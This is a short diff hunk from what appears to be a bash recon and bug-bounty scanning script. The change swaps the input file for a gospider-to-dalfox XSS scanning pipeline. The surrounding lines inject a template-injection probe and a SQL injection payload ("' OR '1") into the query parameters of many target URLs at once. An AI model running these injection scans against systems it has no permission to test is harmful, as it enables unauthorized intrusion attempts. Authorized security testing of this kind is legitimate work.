@@ -239,7 +239,7 @@ cat $2-allurls.txt |grep '=' | qsreplace "xssfound{{7*7}}"  | httpx -match-regex
 
 echo -e "Starting ${GREEN}XSS oneliner with Dalfox${NORMAL} on $1... ${NORMAL} "
 sleep 2
-gospider -S $2-allurls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o $2-XSSDalfox.txt
+gospider -S $2-alive.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o $2-XSSDalfox.txt
 
 echo -e "Starting ${GREEN}SQLInjection Check${NORMAL} for on $1... ${NORMAL}"
 cat $2-allurls.txt |grep '=' |qsreplace "' OR '1" | httpx -silent -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n" > $2-sqlinjection.txt
